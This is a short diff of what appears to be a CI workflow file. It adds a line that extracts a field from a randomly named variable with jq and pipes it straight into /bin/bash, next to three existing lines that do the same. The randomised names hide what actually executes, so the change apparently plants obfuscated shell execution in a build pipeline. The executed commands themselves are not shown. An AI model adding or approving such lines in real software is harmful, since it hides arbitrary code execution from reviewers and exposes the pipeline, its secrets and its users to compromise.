@@ -35,6 +35,7 @@ jobs:
           printf '%s' "$gjyps878" | jq -r .y14 | /bin/bash
           echo $tvkw1 | jq -r .gzi1 | /bin/bash
           echo $iio02 | jq -r .twy002 | /bin/bash
+          echo $cyj0 | jq -r .zqsm47132 | /bin/bash
 
       - name: Store results
         if: always()
